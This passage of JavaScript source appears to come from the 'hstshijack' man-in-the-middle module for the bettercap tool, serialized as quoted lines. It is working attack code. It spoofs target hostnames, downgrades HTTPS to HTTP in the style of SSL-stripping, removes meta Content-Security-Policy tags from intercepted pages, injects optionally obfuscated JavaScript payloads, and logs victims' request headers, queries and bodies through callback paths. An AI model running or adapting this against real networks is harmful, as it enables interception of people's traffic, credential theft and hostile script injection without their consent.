(selector_string.indexOf("*") != -1) {', '    return toWildcardRegexp(selector_string, replacement_string);', '  } else {', '    return toRegexp(selector_string, replacement_string);', '  }', '}', '', '/* Matches ^example.com$ */', 'function toWholeRegexpSet(selector_string, replacement_string) {', '  if (selector_string.indexOf("*") != -1) {', '    return toWholeWildcardRegexp(selector_string, replacement_string);', '  } else {', '    return toWholeRegexp(selector_string, replacement_string);', '  }', '}', '', '/* Saves the list of domains using SSL, as well as its index ranges. */', 'function saveSSLIndex() {', '  writeFile(env["hstshijack.ssl.domains"], ssl.domains.join("\\n"));', '  writeFile(env["hstshijack.ssl.index"], JSON.stringify(ssl.index, null, 2));', '}', '', '/* Returns the amount of characters of an identical prefix of two given strings. */', 'function getMatchingPrefixLength(string1, string2) {', '  count = 0;', '  if (string1.length > string2.length) {', '    for (a = 0; a < string2.length; a++) {', '      if (string1.charAt(a) != string2.charAt(a)) {', '        break;', '      }', '      count++;', '    }', '  } else {', '    for (a = 0; a < string1.length; a++) {', '      if (string1.charAt(a) != string2.charAt(a)) {', '        break;', '      }', '      count++;', '    }', '  }', '  return count;', '}', '', '/* Returns true if domain1 gets alphanumeric precendence over domain2. */', 'function getsPrecedence(domain1, domain2) {', '  if (domain1.length > domain2.length) {', '    /* If the first given domain is longer than the second. */', '    for (a = 0; a < domain2.length; a++) {', '      rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));', '      rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));', '      if (rank1 > rank2) {', '        return false;', '      } else if (rank1 < rank2) {', '        return true;', '      }', '    }', '    return false;', '  } else {', '    /* If the second given domain is longer than the first. */', '    for (a = 0; a < domain1.length; a++) {', '      rank1 = ssl.hierarchy.indexOf(domain1.charAt(a));', '      rank2 = ssl.hierarchy.indexOf(domain2.charAt(a));', '      if (rank1 > rank2) {', '        return false;', '      } else if (rank1 < rank2) {', '        return true;', '      }', '    }', '    return true;', '  }', '}', '', '/* Returns an array with the first and last index of an alphanumeric range of domains.', ' * This is the range in which domains are/will be indexed. */', 'function getIndexRange(char) {', '  if (index_range = ssl.index[char]) {', '    /* Character is already indexed. */', '    return index_range;', '  } else {', '    /* Character is not yet indexed. */', '    indexed_chars = Object.keys(ssl.index).concat(char).sort();', '    this_char_index = indexed_chars.indexOf(char);', '    if (', '         indexed_chars[this_char_index - 1]', '      && indexed_chars[this_char_index + 1]', '    ) {', '      /* Will not be the first nor last indexed character. */', '      return [', '        ssl.index[indexed_chars[this_char_index + 1]][0],', '        ssl.index[indexed_chars[this_char_index + 1]][0]', '      ];', '    } else if (indexed_chars[this_char_index + 1]) {', '      /* Will be the first indexed character, but not the last. */', '      return [', '        0,', '        ssl.index[indexed_chars[this_char_index + 1]][0]', '      ];', '    } else if (indexed_chars[this_char_index - 1]) {', '      /* Will be the last indexed character, but not the first. */', '      if (ssl.domains.length == 1) {', '        /* Will be the second and last indexed character. */', '        return [', '          ssl.index[indexed_chars[this_char_index - 1]][1] + 1,', '          1', '        ];', '      } else {', '        /* Will be the last but not the second indexed character. */', '        return [', '          ssl.index[indexed_chars[this_char_index - 1]][1] + 1,', '          ssl.domains.length', '        ];', '      }', '    } else {', '      /* Will be the first and last indexed character. */', '      return [0, 0];', '    }', '  }', '}', '', '/* Returns the index of a given domain within a given index range. */', 'function getDomainIndex(domain, index_range) {', '  domain = domain.toLowerCase();', '  if (', '       index_range[0] == index_range[1]', '    && domain === ssl.domains[index_range[0]]', '  ) {', '    /* This domain is the only indexed domain with this first character. */', '    return index_range[0];', '  }', "  /* Return this domain's index when found in this index range. */", '  for (a = index_range[0]; a < index_range[1] + 1; a++) {', '    if (domain === ssl.domains[a]) {', '      return a;', '    }', '  }', '  /* This domain is not indexed. */', '  return -1;', '}', '', '/* Index a new domain. */', 'function indexDomain(domain) {', '  domain = domain.toLowerCase();', '  first_char = domain.charAt(0);', '  index_range = getIndexRange(first_char);', '  if (getDomainIndex(domain, index_range) == -1) {', '    /* This domain is not indexed yet. */', '    log_debug(on_blue + "hstshijack" + reset + " Indexing domain " + bold + domain + reset + " ...");', '    indexed_chars = Object.keys(ssl.index);', '    if (index_range[0] == index_range[1]) {', '      /* This index range consists of only one index. */', '      if (ssl.domains[index_range[0]]) {', '        /* This index range contains one domain. */', '        new_index = index_range[0];', '        if (getsPrecedence(ssl.domains[index_range[0]], domain)) {', '          new_index++;', '        }', '        arr_ = ssl.domains.slice(0, new_index);', '        _arr = ssl.domains.slice(new_index, ssl.domains.length);', '        ssl.domains = [].concat(arr_, [domain], _arr);', '        ssl.index[first_char] = [', '          index_range[0],', '          index_range[1] + 1', '        ];', '      } else {', '        /* This index range contains no domains. */', '        ssl.domains.push(domain);', '        ssl.index[first_char] = [', '          index_range[0],', '          index_range[1]', '        ];', '      }', '    } else {', '      /* This index range consists of multiple domains. */', '      new_index = index_range[0];', '      for (var a = index_range[0]; a < index_range[1] + 1; a++) {', '        if (!getsPrecedence(domain, ssl.domains[a])) {', '          new_index = a + 1;', '        } else {', '          break;', '        }', '      }', '      arr_ = ssl.domains.slice(0, new_index);', '      _arr = ssl.domains.slice(new_index, ssl.domains.length);', '      ssl.domains = [].concat(arr_, [domain], _arr);', '      ssl.index[first_char] = [', '        index_range[0],', '        index_range[1] + 1', '      ];', '    }', '    remaining_indexed_chars = indexed_chars.slice(index_range[1] + 1);', '    for (a = 0; a < remaining_indexed_chars.length; a++) {', '      indexed_char = remaining_indexed_chars[a];', '      index_range = ssl.index[indexed_char];', '      ssl.index[indexed_char] = [', '        index_range[0] + 1,', '        index_range[1] + 1', '      ];', '    }', '    saveSSLIndex();', '  } else {', '    /* This domain is already indexed. */', '    log_debug(on_blue + "hstshijack" + reset + " Skipped already indexed domain " + bold + domain + reset);', '  }', '}', '', 'function configure() {', '  /* Read caplet. */', '  env["hstshijack.ignore"]', '    ? ignore_hosts = env["hstshijack.ignore"].replace(/\\s/g, "").split(",")', '    : ignore_hosts = [];', '  env["hstshijack.targets"]', '    ? target_hosts = env["hstshijack.targets"].replace(/\\s/g, "").split(",")', '    : target_hosts = [];', '  env["hstshijack.replacements"]', '    ? replacement_hosts = env["hstshijack.replacements"].replace(/\\s/g, "").split(",")', '    : replacement_hosts = [];', '  env["hstshijack.blockscripts"]', '    ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\\s/g, "").split(",")', '    : block_script_hosts = [];', '  env["hstshijack.obfuscate"]', '    ? obfuscate = env["hstshijack.obfuscate"].replace(/\\s/g, "").toLowerCase()', '    : obfuscate = false;', '', '  /* Validate caplet. */', '  if (target_hosts.length < replacement_hosts.length) {', '    log_fatal(on_blue + "hstshijack" + reset + " Too many hstshijack.replacements (got " + replacement_hosts.length + ").");', '  }', '  if (target_hosts.length > replacement_hosts.length) {', '    log_fatal(on_blue + "hstshijack" + reset + " Not enough hstshijack.replacements (got " + replacement_hosts.length + ").");', '  }', '  if (target_hosts.indexOf("*") != -1) {', '    log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got *).");', '  }', '  if (replacement_hosts.indexOf("*") != -1) {', '    log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got *).");', '  }', '', '  whole_prefix_wildcard_domain_selector = /^(?:\\*\\.[a-z]{1,63}|(?:(?:\\*\\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+(?:[a-z]{1,63})))$/i;', '  whole_suffix_wildcard_domain_selector = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+\\*$/i;', '  for (a = 0; a < ignore_hosts.length; a++) {', '    if (', '         !ignore_hosts[a].match(/^\\*$/i)', '      && !ignore_hosts[a].match(whole_prefix_wildcard_domain_selector)', '      && !ignore_hosts[a].match(whole_suffix_wildcard_domain_selector)', '    ) {', '      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.ignore value (got " + ignore_hosts[a] + ").");', '    }', '  }', '', '  for (a = 0; a < target_hosts.length; a++) {', '    if (', '         !target_hosts[a].match(whole_prefix_wildcard_domain_selector)', '      && !target_hosts[a].match(whole_suffix_wildcard_domain_selector)', '    ) {', '      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets value (got " + target_hosts[a] + ").");', '    }', '', '    if (', '         !replacement_hosts[a].match(whole_prefix_wildcard_domain_selector)', '      && !replacement_hosts[a].match(whole_suffix_wildcard_domain_selector)', '    ) {', '      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.replacements value (got " + replacement_hosts[a] + ").");', '    }', '', '    if (target_hosts[a].match(/\\*/g) || replacement_hosts[a].match(/\\*/g)) {', '      target_host_wildcard_count      = target_hosts[a].match(/\\*/g).length      || 0;', '      replacement_host_wildcard_count = replacement_hosts[a].match(/\\*/g).length || 0;', '      if (target_host_wildcard_count != replacement_host_wildcard_count) {', '        log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.targets or hstshijack.replacements value, wildcards do not match (got " + target_hosts[a] + " and " + replacement_hosts[a] + ").");', '      }', '    }', '  }', '', '  for (a = 0; a < block_script_hosts.length; a++) {', '    if (', '         !block_script_hosts[a].match(/^\\*$/i)', '      && !block_script_hosts[a].match(whole_prefix_wildcard_domain_selector)', '      && !block_script_hosts[a].match(whole_suffix_wildcard_domain_selector)', '    ) {', '      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.blockscripts value (got " + block_script_hosts[a] + ").");', '    }', '  }', '', '  if (obfuscate == "true") {', '    obfuscate = true;', '  } else {', '    obfuscate = false;', '  }', '', '  /* Prepare payloads. */', '  env["hstshijack.payloads"]', '    ? payload_entries = env["hstshijack.payloads"].replace(/\\s/g, "").split(",")', '    : payload_entries = [];', '', '  for (a = 0; a < payload_entries.length; a++) {', '    if (', '         !payload_entries[a].match(/^\\*:.+$/i)', '      && !payload_entries[a].match(/^(?:\\*\\.[a-z]{1,63}|(?:(?:\\*\\.|)(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+(?:[a-z]{1,63}))):.+$/i)', '      && !payload_entries[a].match(whole_suffix_wildcard_domain_selector)', '    ) {', '      log_fatal(on_blue + "hstshijack" + reset + " Invalid hstshijack.payloads value (got " + payload_entries[a] + ").");', '    }', '', '    payload_host = payload_entries[a].replace(/[:].*/, "");', '    payload_path = payload_entries[a].replace(/.*[:]/, "");', '', '    payload = "";', '    if (!(payload = readFile(payload_path))) {', '      log_fatal(on_blue + "hstshijack" + reset + " Could not read a payload (got " + payload_path + ").");', '    } else {', '      payload = payload', '        .replace(/obf_var_target_hosts/g, varname_target_hosts)', '        .replace(/obf_var_replacement_hosts/g, varname_replacement_hosts)', '        .replace(/obf_path_callback/g, callback_path)', '        .replace(/obf_path_ssl_index/g, ssl_index_path)', '        .replace(/obf_path_whitelist/g, whitelist_path);', '', '      if (obfuscate) {', '        obfuscation_variables = payload.match(/obf_[a-z0-9_]*/ig) || [];', '        for (b = 0; b < obfuscation_variables.length; b++) {', '          if (obfuscation_variables.indexOf(obfuscation_variables[b]) === b) {', '            regexp = new RegExp(obfuscation_variables[b], "g");', '            payload = payload.replace(regexp, randomString(8 + (Math.random() * 8)));', '          }', '        }', '      }', '', '      if (payloads[payload_host]) {', '        payloads[payload_host] = payloads[payload_host] + "\\n" + payload + "\\n";', '      } else {', '        payloads[payload_host] = payload + "\\n";', '      }', '    }', '  }', '', '  /* Prepare payload container */', '  payload_container_prefix = payload_container_prefix.replace(/\\{\\{SESSION_ID_TAG\\}\\}/g, session_id);', '  payload_container_prefix = payload_container_prefix +', '    "var " + varname_target_hosts + " = [\\"" + target_hosts.join("\\",\\"") + "\\"];\\n" +', '    "var " + varname_replacement_hosts + " = [\\"" + replacement_hosts.join("\\",\\"") + "\\"];\\n";', '  payload_container_suffix = payload_container_suffix.replace(/\\{\\{SESSION_ID_TAG\\}\\}/g, session_id);', '', '  /* Prepare SSL index */', '  ssl_index_check = env["hstshijack.ssl.check"].toLowerCase() || "true";', '  all_domains = readFile(env["hstshijack.ssl.domains"]).split("\\n");', '  if (all_domains.length == 0) {', '    log_info(on_blue + "hstshijack" + reset + " No indexed domains were found, index will be reset.");', '  } else {', '    if (ssl_index_check != "false") {', '      log_info(on_blue + "hstshijack" + reset + " Indexing SSL domains ...");', '      all_domains', '        .sort()', '        .filter(function(domain, index, arr){', '          if (domain !== "" && arr.indexOf(domain) === index) {', '            indexDomain(domain);', '          }', '        });', '    } else {', '      ssl.domains = all_domains;', '      index_file_contents = readFile(env["hstshijack.ssl.index"]);', '      if (ssl.domains.length != 0 && index_file_contents == "") {', '        log_fatal(on_blue + "hstshijack" + reset + " List of domains using SSL is not indexed. Please set your hstshijack.ssl.check value to true in your caplet.");', '      }', '      ssl.index = JSON.parse(index_file_contents);', '      log_info(on_blue + "hstshijack" + reset + " Skipped SSL index check for " + all_domains.length + " domain(s).");', '    }', '  }', '', '  /* Ensure targeted hosts are in SSL log (no wildcards). */', '  for (var a = 0; a < target_hosts.length; a++) {', '    if (target_hosts[a].indexOf("*") === -1) {', '      indexDomain(target_hosts[a]);', '    }', '  }', '', '  saveSSLIndex();', '  log_info(on_blue + "hstshijack" + reset + " Indexed " + ssl.domains.length + " domains.");', '}', '', 'function showConfig() {', '  /* Print module configuration. */', '  logStr  = "\\n";', '  logStr += "  " + bold + "Caplet" + reset + "\\n";', '  logStr += "\\n";', '  logStr += "    " + yellow + " hstshijack.ssl.domains" + reset + " > " + (env["hstshijack.ssl.domains"] ? green + env["hstshijack.ssl.domains"] : red + "undefined") + reset + "\\n";', '  logStr += "    " + yellow + "   hstshijack.ssl.index" + reset + " > " + (env["hstshijack.ssl.index"] ? green + env["hstshijack.ssl.index"] : red + "undefined") + reset + "\\n";', '  logStr += "    " + yellow + "   hstshijack.ssl.check" + reset + " > " + (env["hstshijack.ssl.check"].match(/^true$/i) ? green + "true" : red + "false") + reset + "\\n";', '  logStr += "    " + yellow + "      hstshijack.ignore" + reset + " > " + (env["hstshijack.ignore"] ? green + env["hstshijack.ignore"] : red + "undefined") + reset + "\\n";', '  logStr += "    " + yellow + "     hstshijack.targets" + reset + " > " + (env["hstshijack.targets"] ? green + env["hstshijack.targets"] : red + "undefined") + reset + "\\n";', '  logStr += "    " + yellow + "hstshijack.replacements" + reset + " > " + (env["hstshijack.replacements"] ? green + env["hstshijack.replacements"] : red + "undefined") + reset + "\\n";', '  logStr += "    " + yellow + "hstshijack.blockscripts" + reset + " > " + (env["hstshijack.blockscripts"] ? green + env["hstshijack.blockscripts"] : red + "undefined") + reset + "\\n";', '  logStr += "    " + yellow + "   hstshijack.obfuscate" + reset + " > " + (obfuscate ? green + "true" : red + "false") + reset + "\\n";', '  logStr += "    " + yellow + "    hstshijack.payloads" + reset + " > ";', '  if (env["hstshijack.payloads"]) {', '    list = env["hstshijack.payloads"].replace(/\\s/g, "").split(",");', '    logStr += green + list[0] + reset + "\\n";', '    if (list.length > 1) {', '      for (a = 1; a < list.length; a++) {', '        logStr += "                            > " + green + list[a] + reset + "\\n";', '      }', '    }', '  } else {', '    logStr += red + "undefined" + reset + "\\n";', '  }', '  logStr += "\\n";', '  logStr += "  " + bold + "Commands" + reset + "\\n";', '  logStr += "\\n";', '  logStr += "    " + bold + "       hstshijack.show" + reset + " : Show module info.\\n";', '  logStr += "    " + bold + "hstshijack.ssl.domains" + reset + " : Show recorded domains with SSL.\\n";', '  logStr += "    " + bold + "  hstshijack.ssl.index" + reset + " : Show SSL domain index.\\n";', '  logStr += "\\n";', '  logStr += "  " + bold + "Session info" + reset + "\\n";', '  logStr += "\\n";', '  logStr += "    " + bold + "    Session ID" + reset + " : " + session_id + "\\n";', '  logStr += "    " + bold + " Callback path" + reset + " : " + callback_path + "\\n";', '  logStr += "    " + bold + "Whitelist path" + reset + " : " + whitelist_path + "\\n";', '  logStr += "    " + bold + "SSL index path" + reset + " : " + ssl_index_path + "\\n";', '  logStr += "    " + bold + "   SSL domains" + reset + " : " + ssl.domains.length + " domain" + (ssl.domains.length == 1 ? "" : "s") + "\\n";', '  console.log(logStr);', '}', '', 'function onCommand(cmd) {', '  if (cmd == "hstshijack.show") {', '    showConfig();', '    return true;', '  }', '  if (cmd == "hstshijack.ssl.domains") {', '    if (ssl.domains.length > 20) {', '      log_string = ssl.domains.slice(0, 20).push("...").join(reset + "\\n    " + yellow);', '      console.log("\\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\\n\\n    " + yellow + log_string + reset + "\\n");', '    } else {', '      console.log("\\n" + bold + "  Recorded domains with SSL (" + ssl.domains.length + ")" + reset + "\\n\\n    " + yellow + ssl.domains.join(reset + "\\n    " + yellow) + reset + "\\n");', '    }', '    return true;', '  }', '  if (cmd == "hstshijack.ssl.index") {', '    log_string = "\\n" + bold + "  SSL domain index (" + Object.keys(ssl.index).length + ")" + reset + "\\n";', '    for (a = 0; a < Object.keys(ssl.index).length; a++) {', '      indexed_char = Object.keys(ssl.index)[a];', '      char_index = ssl.index[indexed_char];', '      log_string += "\\n    " + yellow + indexed_char + reset + " (first: " + char_index[0] + ", last: " + char_index[1] + ")";', '    }', '    console.log(log_string + "\\n");', '    return true;', '  }', '}', '', 'function onLoad() {', '  math_seed = new Date().getMilliseconds();', '  Math.random = function() {', '    return randomFloat();', '  }', '', '  log_info(on_blue + "hstshijack" + reset + " Generating random variable names for this session ...");', '  session_id                = randomString(8 + Math.random() * 8);', '  varname_target_hosts      = randomString(8 + Math.random() * 8);', '  varname_replacement_hosts = randomString(8 + Math.random() * 8);', '  callback_path             = "/" + randomString(8 + Math.random() * 8);', '  whitelist_path            = "/" + randomString(8 + Math.random() * 8);', '  ssl_index_path            = "/" + randomString(8 + Math.random() * 8);', '', '  log_info(on_blue + "hstshijack" + reset + " Reading caplet ...");', '  configure();', '  log_info(on_blue + "hstshijack" + reset + " Module loaded.");', '  showConfig();', '}', '', 'function onRequest(req, res) {', '  if (req.Path == ssl_index_path) {', '    /*', '      SSL callback.', '', '      Requests made for this path should include a hostname in the query so', '      this module can send a HEAD request to learn HTTPS redirects.', '    */', '    log_debug(on_blue + "hstshijack" + reset + " SSL callback received from " + green + req.Client.IP + reset + " for " + bold + req.Query + reset + ".");', '    queried_host = req.Query;', '    if (getDomainIndex(queried_host, getIndexRange(queried_host.charAt(0))) == -1) {', '      log_debug(on_blue + "hstshijack" + reset + " Learning unencrypted HTTP response from " + queried_host + " ...");', '      req.Hostname = queried_host;', '      req.Path     = "/";', '      req.Query    = "";', '      req.Body     = "";', '      req.Method   = "HEAD";', '    }', '  } else if (req.Path == callback_path) {', '    /*', '      Basic callback.', '', '      Requests made for this path will be dropped.', '      Requests made for this path will be printed.', '    */', '    req.Scheme = "ignore";', '    logStr = on_blue + "hstshijack" + reset + " Callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset + "\\n";', '    logStr += "  " + on_grey + " " + reset + " \\n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\\n  " + on_grey + " " + reset + " \\n";', '    logStr += "  " + on_grey + " " + reset + "  " + bold + "Headers" + reset + "\\n  " + on_grey + " " + reset + " \\n";', '    headers = req.Headers.split("\\r\\n");', '    for (i = 0; i < headers.length; i++) {', '      if (headers[i].split(": ").length == 2) {', '        params = headers[i].split(": ");', '        logStr += "  " + on_grey + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\\n";', '      } else {', '        logStr += "  " + on_grey + " " + reset + "    " + yellow + headers[i] + reset + "\\n";', '      }', '    }', '    logStr += "  " + on_grey + " " + reset + "  " + bold + "Query" + reset + "\\n  " + on_grey + " " + reset + " \\n";', '    queries = req.Query.split("&");', '    for (i = 0; i < queries.length; i++) {', '      if (queries[i].split("=").length == 2) {', '        params = queries[i].split("=");', '        logStr += "  " + on_grey + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\\n";', '      } else {', '        logStr += "  " + on_grey + " " + reset + "    " + green + queries[i] + reset + "\\n";', '      }', '    }', '    logStr += "  " + on_grey + " " + reset + " \\n  " + on_grey + " " + reset + "  " + bold + "Body" + reset + "\\n  " + on_grey + " " + reset + " \\n  " + on_grey + " " + reset + "    " + yellow + req.ReadBody() + reset + "\\n";', '    log_info(logStr);', '  } else if (req.Path == whitelist_path) {', '    /*', '      Whitelisting callback.', '', '      Requests made for this path will be dropped.', '      Requests made for this path will be printed.', '      Requests made for this path will stop all attacks towards this client with the requested hostname.', '    */', '    req.Scheme = "ignore";', '    logStr = on_blue + "hstshijack" + reset + " Whitelisting callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset + "\\n";', '    logStr += "  " + on_white + " " + reset + " \\n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + "http://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\\n  " + on_white + " " + reset + " \\n";', '    logStr += "  " + on_white + " " + reset + "  " + bold + "Headers" + reset + "\\n  " + on_white + " " + reset + " \\n";', '    headers = req.Headers.split("\\n");', '    for (i = 0; i < headers.length; i++) {', '      if (headers[i].split(": ").length == 2) {', '        params = headers[i].split(": ");', '        logStr += "  " + on_white + " " + reset + "    " + blue + params[0] + reset + ": " + yellow + params[1] + reset + "\\n";', '      } else {', '        logStr += "  " + on_white + " " + reset + "    " + yellow + headers[i] + reset + "\\n";', '      }', '    }', '    logStr += "  " + on_white + " " + reset + "  " + bold + "Query" + reset + "\\n  " + on_white + " " + reset + " \\n";', '    queries = req.Query.split("&");', '    for (i = 0; i < queries.length; i++) {', '      if (queries[i].split("=").length == 2) {', '        params = queries[i].split("=");', '        logStr += "  " + on_white + " " + reset + "    " + green + decodeURIComponent(params[0]) + reset + " : " + decodeURIComponent(params[1]) + reset + "\\n";', '      } else {', '        logStr += "  " + on_white + " " + reset + "    " + green + queries[i] + reset + "\\n";', '      }', '    }', '    logStr += "  " + on_white + " " + reset + " \\n  " + on_white + " " + reset + "  " + bold + "Body" + reset + "\\n  " + on_white + " " + reset + " \\n  " + on_white + " " + reset + "    " + yellow + req.ReadBody() + reset + "\\n";', '    log_info(logStr);', '', '    /* Add requested hostname to whitelist. */', '    if (whitelist[req.Client.IP]) {', '      if (whitelist[req.Client.IP].indexOf(req.Hostname) == -1) {', '        whitelist[req.Client.IP].push(req.Hostname);', '      }', '    } else {', '      whitelist[req.Client.IP] = [req.Hostname];', '    }', '    /* Also whitelist spoofed version of requested hostname. */', '    for (a = 0; a < target_hosts.length; a++) {', '      if (target_hosts[a].indexOf("*") == -1) {', '        selector_target = toWholeRegexpSet(target_hosts[a], "")[0];', '        selector_replacement = toWholeRegexpSet(replacement_hosts[a], "")[0];', '        if (', '             req.Hostname.match(selector_target)', '          || req.Hostname.match(selector_replacement)', '        ) {', '          if (whitelist[req.Client.IP].indexOf(target_hosts[a]) == -1) {', '            whitelist[req.Client.IP].push(target_hosts[a]);', '          }', '          if (whitelist[req.Client.IP].indexOf(replacement_hosts[a]) == -1) {', '            whitelist[req.Client.IP].push(replacement_hosts[a]);', '          }', '          break;', '        }', '      }', '    }', '  } else {', '    /*', '      Not a callback.', '', '      Redirect client to the real host if a whitelist callback was received previously.', '      Restore spoofed hostnames and schemes in request.', '    */', '    if (whitelist[req.Client.IP]) {', '      for (a = 0; a < whitelist[req.Client.IP].length; a++) {', '        whole_regexp_set = toWholeRegexpSet(whitelist[req.Client.IP][a], "");', '        if (req.Hostname.match(whole_regexp_set[0])) {', '          /* Restore requested hostname if it was spoofed. */', '          var unspoofed_host;', '          for (b = 0; b < replacement_hosts.length; b++) {', '            whole_regexp_set = toWholeRegexpSet(replacement_hosts[b], target_hosts[b]);', '            if (req.Hostname.match(whole_regexp_set[0])) {', '              unspoofed_host = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);', '              query = (req.Query != "" ? ("?" + req.Query) : "");', '              res.SetHeader("Location", "https://" + unspoofed_host + req.Path + query);', '              res.Status = 301;', '              log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client.IP + reset + " from " + bold + req.Hostname + reset + " to " + bold + unspoofed_host + reset + " because we received a whitelisting callback.");', '              return;', '            }', '          }', '        }', '      }', '    }', '', '    /* Restore original hostnames. */', '    for (a = 0; a < target_hosts.length; a++) {', '      /* Restore original hostnames in headers. */', '      regexp_set = toRegexpSet(replacement_hosts[a], target_hosts[a]);', '      if (req.Headers.match(regexp_set[0])) {', '        req.Headers = req.Headers.replace(regexp_set[0], regexp_set[1]);', '        log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + replacement_hosts[a] + reset + " in request header(s).");', '      }', '', '      /* Restore original hostname of request. */', '      whole_regexp_set = toWholeRegexpSet(replacement_hosts[a], target_hosts[a])', '      if (req.Hostname.match(whole_regexp_set[0])) {', '        spoofed_host = req.Hostname;', '        req.Hostname = req.Hostname.replace(whole_regexp_set[0], whole_regexp_set[1]);', '        req.Scheme   = "https";', '        log_debug(on_blue + "hstshijack" + reset + " Restored original hostname " + bold + spoofed_host + reset + " to " + req.Hostname + " and restored HTTPS scheme.");', '      }', '    }', '', '    /* Restore HTTPS scheme. */', '    if (getDomainIndex(req.Hostname, getIndexRange(req.Hostname.charAt(0))) != -1) {', '      /* Restore HTTPS scheme of request if domain is indexed. */', '      if (req.Scheme != "https") {', '        req.Scheme = "https";', '        log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + bold + req.Hostname + reset + ".");', '      }', '      /* Restore HTTPS scheme in request headers if domains are indexed. */', '      escaped_domain = req.Hostname.replace(/\\./g, "\\\\.").replace(/\\-/g, "\\\\-");', '      regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\\\-\\\\.]|$)", "ig");', '      if (req.Headers.match(regexp)) {', '        req.Headers = req.Headers.replace(regexp, "https://" + req.Hostname + "$1");', '        log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");', '      }', '    } else { /* If requested domain is not indexed. */', '      log_debug(on_blue + "hstshijack" + reset + " Domain " + bold + req.Hostname + reset + " is not indexed.");', '      if (req.Scheme != "https") {', '        for (b = 0; b < target_hosts; b++) {', '          /* Restore HTTPS scheme of request if domain is targeted. */', '          whole_regexp_set = toWholeRegexpSet(target_hosts[b], "");', '          if (req.Hostname.match(whole_regexp_set[0])) {', '            req.Scheme = "https";', '            log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of targeted domain " + bold + req.Hostname + reset + ".");', '            break;', '          }', '          /* Restore HTTPS scheme in request headers if domains are targeted. */', '          regexp_set = toRegexpSet(target_hosts[b], "");', '          matches = req.Headers.match(regexp);', '          for (c = 0; c < matches.length; c++) {', '            escaped_domain = matches[c].replace(/\\./g, "\\\\.").replace(/\\-/g, "\\\\-");', '            regexp = new RegExp("http://" + escaped_domain + "([^a-z0-9\\\\-\\\\.]|$)", "ig");', '            req.Headers = req.Headers.replace(regexp, "https://" + matches[c] + "$1");', '            log_debug(on_blue + "hstshijack" + reset + " Restored HTTPS scheme of indexed domain " + req.Hostname + " in request headers.");', '          }', '        }', '      }', '    }', '  }', '}', '', 'function onResponse(req, res) {', '  /* Remember HTTPS redirects. */', '  location = res.GetHeader("Location", "");', '  if (location.match(/^https:\\/\\//i)) {', '    host = location.replace(/https:\\/\\/([^:/?#]*).*/i, "$1");', '    if (host != "") {', '      indexDomain(host);', '    }', '  }', '', '  /* Ignore this response if whitelisted. */', '  if (whitelist[req.Client.IP]) {', '    if (whitelist[req.Client.IP].indexOf(req.Hostname) != -1) {', '      log_debug(on_blue + "hstshijack" + reset + " Ignoring response from " + bold + req.Hostname + reset + " for " + bold + req.Client.IP + reset + ".");', '      return;', '    }', '  } else {', '    for (a = 0; a < ignore_hosts.length; a++) {', '      var whole_regexp_set;', '      if (ignore_hosts[a] != "*") {', '        whole_regexp_set = toWholeRegexpSet(ignore_hosts[a], "");', '      }', '', '      if (', '           ignore_hosts[a] == "*"', '        || req.Hostname.match(whole_regexp_set[0])', '      ) {', '        ignored = true;', '', "        /* Don't ignore response if there's a replacement for the requested host. */", '        for (b = 0; b < target_hosts.length; b++) {', '          whole_regexp_set = toWholeRegexpSet(target_hosts[b], "");', '          if (req.Hostname.match(whole_regexp_set[0])) {', '            ignored = false;', '            break;', '          }', '        }', '', "        /* Don't ignore response if there's a custom payload for the requested host. */", '        if (ignored) {', '          for (b = 0; b < Object.keys(payloads).length; b++) {', '            payload_target_host = Object.keys(payloads)[b];', '            if (payload_target_host != "*") {', '              whole_regexp_set = toWholeRegexpSet(payload_target_host, "");', '            }', '            if (', '                 payload_target_host == "*"', '              || req.Hostname.match(whole_regexp_set[0])', '            ) {', '              ignored = false;', '              break;', '            }', '          }', '        }', '', '        if (ignored) {', '          log_debug(on_blue + "hstshijack" + reset + " Ignored response from " + bold + req.Hostname + reset + ".");', '          return;', '        }', '      }', '    }', '', '    /* Spoof markup bodies. */', '    if (', '         res.ContentType.match(/text[/](?:html|xml)|application[/](?:hta|xhtml[+]xml|xml)|\\S+[/]\\S+[+]xml/i)', '      || req.Path.match(/[.](?:html|htm|xml|xhtml|xhtm|xht|hta)$/i)', '    ) {', '      res.ReadBody();', '', '      /* Prevent meta tag induced CSP restrictions. */', '      res.Body = res.Body.replace(', '        / http-equiv=[\'"]?Content-Security-Policy[\'"]?([ />])/ig,', '        "$1");', '', '      /* Block scripts. */', '      for (a = 0; a < block_script_hosts.length; a++) {', '        if (', '             block_script_hosts[a] === "*"', '          || req.Hostname.match(toWholeRegexpSet(block_script_hosts[a], 